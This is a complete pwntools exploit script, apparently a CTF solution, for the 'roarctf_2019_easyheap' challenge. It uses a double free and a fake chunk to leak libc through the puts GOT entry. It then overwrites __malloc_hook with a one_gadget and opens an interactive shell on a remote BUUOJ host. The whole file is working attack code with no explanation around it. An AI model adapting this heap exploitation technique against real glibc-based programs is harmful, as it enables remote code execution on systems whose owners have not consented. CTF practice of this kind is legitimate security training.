from pwn import *

elf = ELF('roarctf_2019_easyheap')

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def malloc(size, content, flag=False):
    if not flag:
        sla(b'>> ', b'1')
        sla(b'size', str(size).encode())
        sa(b'content', content)
    else:
        sl(b'1')
        sleep(0.1)
        sl(str(size).encode())
        sleep(0.1)
        sl(content)
        sleep(0.1)

def delete(flag=False):
    if not flag:
        sla(b'>> ', b'2')
    else:
        sl(b'2')
        sleep(0.1)

def show():
    sla(b'>> ', b'3')

def calloc(content, flag=False):
    if not flag:
        sla(b'>> ', b'666')
        sla(b'build or free?', '1')
        sa(b'content', content)
    else:
        sl(b'666')
        sleep(0.1)
        sl(b'1')
        sleep(0.1)
        sn(content)
        sleep(0.1)

def cfree(flag=False):
    if not flag:
        sla(b'>> ', b'666')
        sla(b'build or free?', '2')
    else:
        sl(b'666')
        sleep(0.1)
        sl(b'2')
        sleep(0.1)

def exp():
    sa(b'name', p64(0) + p64(0x71) + b'\x00' * 0x10)
    fake_chunk = 0x602060

    sla(b'info', b'aa')

    calloc(b'a')
    malloc(0x60, b'a')
    cfree()
    malloc(0x60, b'a')
    malloc(0x60, b'a')
    delete()
    cfree()
    delete()

    malloc(0x60, p64(fake_chunk))
    malloc(0x60, b'a')
    malloc(0x60, b'a')


    puts_got = elf.got['puts']
    malloc(0x60, b'a' * 0x18 + p64(puts_got) + p64(0xDEADBEEFDEADBEEF))
    show()

    #context.log_level = 'debug'
    libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc = libc_base + libc.sym['__libc_realloc']
    one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
    one_gadgets_buu = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    one = libc_base + one_gadgets_buu[3]
    success('libc_base -> {}'.format(hex(libc_base)))

    calloc(b'a', True)
    calloc(b'a' * 0xa0, True)
    malloc(0x60, b'a', True)
    cfree(True)
    malloc(0x60, b'a', True)
    malloc(0x60, b'a', True)

    delete(True)
    cfree(True)
    delete(True)

    malloc(0x60, p64(malloc_hook - 0x23), True)
    malloc(0x60, b'a', True)
    malloc(0x60, b'a', True)
    malloc(0x60, b'a' * 0xb + p64(one) + p64(realloc + 20), True)

    #debug('b *0x400dd5')
    sl(b'1')
    sleep(0.3)
    sl(b'10')
    sleep(0.3)
    p.interactive()

if __name__ == "__main__":
    libc = ELF('libc-2.23.buu.so')
    while True:
        p = remote('node4.buuoj.cn', 27795)
        exp()
        break